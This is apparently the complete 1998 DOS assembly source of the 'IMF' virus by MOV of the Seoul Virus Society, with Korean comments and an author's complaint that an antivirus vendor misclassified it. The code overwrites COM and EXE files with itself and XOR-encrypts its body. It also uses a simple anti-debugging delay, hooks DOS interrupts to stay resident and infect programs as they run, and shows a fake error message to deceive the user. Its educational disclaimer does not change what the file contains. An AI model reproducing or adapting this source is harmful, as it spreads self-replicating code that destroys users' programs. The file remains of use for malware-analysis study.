;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     IMF (Ver E)                             \          \     \   \
;                  by MOV of SVS              \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : IMF (Ver E)
; AV Name    : Miny1
; Author     : MOV (Master Of Virus)
; Group      : SVS (Seoul Virus Society)
; Origin     : Corea
; Date       : 1998/02
;
; Type : Non memory Resident COM,EXE  Overwriting
;
; !****************************************************************************!
; *                                                                            *
; * 경고 !                                                                     *
; *    이것은 바이러스 소스 코드이다. 교육적인 목적으로만 사용되어야한다.      *
; *    제작자는 이 소스코드로 야기되는 어떠한 문제에 대해서도 책임을 지지 않   *
; *    는다. 변형 하거나 실행하지 말라 !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
;--------------------------------------------------------------------------
;       안녕하세요? 첨으로 글을쓰네요.             MOV
;       이 소스 원래 공개 안할려고 했는데
;       분석도 제대로 못하는 안연구소를 위해 이글을 씁니다.
;       이바이러스를 미니1.변형이라고 진단하더군요.
;       버전은 E형입니다. B형과 E형이 발견 됐더군요.
;       미니1변형이란 소릴듣고 굉장히 기분이 나뻤습니다.
;       미니1과 비교하면서 보시기바랍니다.
;       실력있는 사람은 이소스만 봐도 다르다는걸 알껍니다.
;--------------------------------------------------------------------------
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

parasize     equ (vend - start+0fh+256) shr 4   ; 상주할 크기

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                jumps                           ; 터보어셈만의 명령어

                org     100h


start:           call    passw                  ; 암호화
                nop                             ; 간단한 안티 디버깅
                mov     si,9999h
                nop
                nop
start2:
                dec     si
                cmp     si,0 
                jne     start2                  ; 0이 아니면 점푸하라
                mov     ah,(2ah xor 72h)        ; 날짜 읽어 오기 31일이면
                call    xorp                    ; 메시지 출력
                cmp     dl,31
                je      virmm
start3:
                push    ax                      ; AX,Bx,CX,DX 저장
                push    bx
                push    cx
                push    dx
                mov     ah,(4eh xor 72h)        ; 첫 번째 파일을 찾는다
                mov     dx,offset comfiles      ; COM 파일
                xor     cx,cx                   ; 속성은 일반
                call    xorp
again:
                jc      memt
                
                mov     ax,DS:[80h+1eh]         ; 문자열 비교
                cmp     ax,'IW'                 ; 윈도우 파일인가?
                je      next                    ; 맞으면 점푸
                cmp     ax,'OC'
                je      next                    ; COMMAND 파일인가 맞은면 포기
                mov     ah,(43h xor 72h)        ; 속성해제
                mov     al,01h
                xor     cx,cx
                mov     dx,80h+1eh
                call    xorp
                mov     ah,(3dh xor 72h)        ; 파일을 연다
                mov     al,02h
                call    xorp
                xchg    ax,bx                   ; 파일핸들값을 bx에..
                mov     ah,(3fh xor 72h)        ; 3바이트를 읽어온다
                mov     dx,offset oldbyte
                mov     cx,3
                call    xorp
                lea     si,oldbyte              ; call 명령이면 점푸한다 이미
                cmp     byte ptr [si],0e8h      ; 감염됐으므로.
                je      next
                mov     al,02                   ; 파일 끝으로...
                xor     cx,cx
                xor     dx,dx
                mov     ah,42h
                int     21h
                or      dx,dx                   ; 64000바이트보다 크면 다른파
                jnz     next                    ; 일을.
                mov     al,00                   ; 파일 처음으로..
                xor     cx,cx
                xor     dx,dx
                mov     ah,(42h xor 72h)
                call    xorp
                mov     ah,2ch                  ; 시간 읽어온다.
                int     21h
                mov     byte ptr gaza1,dl       ; 가짜 값을 저장한다
                mov     byte ptr gaza2,dl
                mov     byte ptr gaza3,dl
                mov     byte ptr gaza4,dl
                mov     byte ptr gaza5,dl
                mov     byte ptr gaza6,dl
                mov     byte ptr gaza7,dl
                mov     byte ptr gaza8,dl
                mov     byte ptr gaza9,dl
                mov     byte ptr gaza10,dl
                mov     byte ptr gaza11,dl
                mov     byte ptr gaza12,dl
                mov     byte ptr gaza13,dl
                mov     byte ptr gaza14,dl
                mov     byte ptr gaza15,dl
                mov     byte ptr gaza16,dl
                mov     byte ptr gaza17,dl
                mov     byte ptr gaza18,dl
                mov     byte ptr gaza19,dl
                mov     byte ptr gaza20,dl
                mov     byte ptr keygab,18h     ; 18h로 암호화 한다
                call    okw                     ; 바이러스를 쓴다.
                mov     ah,(3eh xor 72h)        ; 파일을 닫는다
                call    xorp

next:
                mov ah,3eh                      ; 실수다 두 번닫는다
                int 21h
                mov ah,(4fh xor 72h)            ; 다음 파일을 찾는다
                call xorp
                jmp again

virmm:
                mov ah,(9 xor 72h)              ; 메세지 출력
                mov dx,offset virm
                call xorp
                mov ah,4ch                      ; 파일끝내기
                int 21h

memt:           cmp     di,1                    ; di 가 0이면 EXE 파일을 감염
                je      nextokok                ; 시킨다.
                mov     ah,4eh
                mov     dx,offset exefiles
                mov     cx,0
                int     21h
                mov     di,1
                jmp     again

nextokok:       mov     ax,3524h                ; 인터럽트24번의 위치를 읽어온다
                int     21h
                mov     word ptr int24x2[0],bx  ; 오프셋값저장
                mov     word ptr int24x2[2],es  ; 세그먼트번지값 저장
                mov     ax,2524h                ; 새로운 인터럽트 24번
                mov     dx,offset int24x1
                int     21h
                mov     ah,(35h xor 72h)        ; 인터럽트 2번의 위치를 읽어온다
                mov     al,21h
                call    xorp                 
                mov     word ptr oldint[0],bx   ;역시 마찬가지로 저장
                mov     word ptr oldint[2],es
                mov     ax,offset int_21h_entry ; 상주여부 검사
                cmp     bx,ax
                je      loc_4
                
                mov     ah,(25h xor 72h)        ; 새로운 인터럽트 21번
                mov     al,21h
                mov     dx,offset int_21h_entry
                call    xorp
                             
                mov     ah,(9 xor 72h)          ; 사용자를 속이기 위한 메세지
                mov     dx,offset virmsg
                call    xorp
                mov     ax,2524h                ; 원래의 인터럽트 24번 으로 돌
                mov     dx,offset int24x2       ; 려준다.
                int     21h                       
                mov     byte ptr keygab,0       ; 암호화 값에다 0을 넣어준다.
                mov     ah,(31h xor 72h)        ; 메모리 상주 자동 종료
                mov     dx,parasize
                call    xorp
loc_4:
                mov ah,(9 xor 72h)              ; 위와 마찬가지
                mov dx,offset virmsg
                call xorp
                mov ax,2524h
                mov dx,offset int24x2
                int 21h
                int 20h

int_21h_entry:
                cmp     ah,4bh                  ; 실행인가?
                jne     loc_5
                push   ds
                push   ax
                push   bx
                push   cx
                push   dx
                push   si
                push   di
                push   cs
                pop    ds
                mov     ax,3524h                ; 메모리 상주한상태에서 24번을
                int     21h                     ; 가로챈다.
                mov     word ptr int24x2[0],bx
                mov     word ptr int24x2[2],es
                mov     ax,2524h
                mov     dx,offset int24x1
                int     21h
                mov     ah,(3Ch xor 72h)        ; 파일 생성
                mov     cx,2               
                mov     bx,5             
                mov     dx,offset data_5
                call    xorp                   
                mov     ah,(40h xor 72h)        ; 바이러스를 쓴다
                mov     cx,offset vend - start
                mov     dx,100h
                call    xorp
                mov     ah,(3Eh xor 72h)        ; 파일을 닫는다
                mov     bx,5
                call    xorp
                mov     ax,2524h                ; 인24번 복구
                mov     dx,offset int24x2
                int     21h
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax             
                pop     ds
 loc_5:
                jmp     dword ptr cs:oldint     ; 원래 인터럽트 21번으로 점푸
int24x2 dd ?
int24x1:
                xor ax,ax
                xor bx,bx
                xor cx,cx
                xor dx,dx
                iret
xorp:
                xor ah,72h
                int 21h
ret
data_5          db      'MEM.COM', 0
virmsg          db      'Incorrect DOS version',0ah,0dh,'$'
oldint          dd ?
comfiles        db '*.C?M',0          
exefiles        db '*.E?E',0
oldbyte         db 0cdh,20h,90h                 ; 3바이트
newmsg:
virm db ' SVS/COREA Made by MOV(Master Of Virus)',0ah,07h,0dh ;만든이 MOV
     db '[IMF Virus] Ver.E (VCL.5249???-> FK2.B)',0ah,07h,0dh
     db '(qnstjr gkffuaus Eht qkfhgo)<--- Hangul',0ah,07h,0dh,'$'
endmsg:                                         ; 암호화 / 파일에 써주는 부분
keygab          db ?
okw:
jmp okok1
gaza16          db ?
okok1:
call passw
                jmp okok2
gaza17          db ?
okok2:
                mov al,40h
                jmp okok3
gaza18 db ?
okok3:
                xchg ah,al
                jmp jok1
gaza8 db ?
jok1:
                mov cx,offset vend - start
                jmp okok4
gaza19 db ?
okok4:
                mov dx,100h
                jmp okok5
gaza20 db ?
okok5:
                int 21h
                jmp jok2
gaza9 db ?
jok2:
                call passw
                ret
passw:
                jmp jojo
gaza10 db ?
jojo:
                mov si,103h
                jmp jok3
gaza1 db ?
gaza15 db ?
jok3:
                mov di,103h
                jmp jok4
gaza2 db ?
gaza14 db ?
jok4:
                mov ah,keygab
                jmp jok5
gaza3 db ?
gaza13 db ?
jok5:
                mov cx,offset endmsg - 103h
                jmp mloop
gaza12 db ?
mloop:
                lodsb
                jmp jok6
gaza4 db ?
jok6:
                xor al,ah
jmp jok7
gaza5 db ?
jok7:
                stosb
                jmp jok11
gaza11 db ?
jok11:
                jmp jok8
gaza6 db ?
jok8:
                loop mloop
                jmp jok9
gaza7 db ?
jok9:
                ret

vend:
seg_a           ends

; FK2 바이러스에서 이미 기생형 COM EXE를 선보였다
; 간단한 XOR 암호화도.
; 근데 미니1 변형이라고 말하니 너무 기분이 나쁘다
; 위를 보면 알겠지만 덮어쓰기와 암호화만 란점만 똑같고
; 메모리 상주 COM EXE 감염방법도 다르다 물론 미니1은 메모리 상주를 안한다
; 그러던데 메모리에서 잡히는건 미니1으로 잡더군.
; 정말 기분 나쁘다 미니1이 MEM.COM 파일을 만드남?
; 하루라도 빨리 MINY1.? ---> IMF Virus로 바꿔주길 바란다...
                end     start

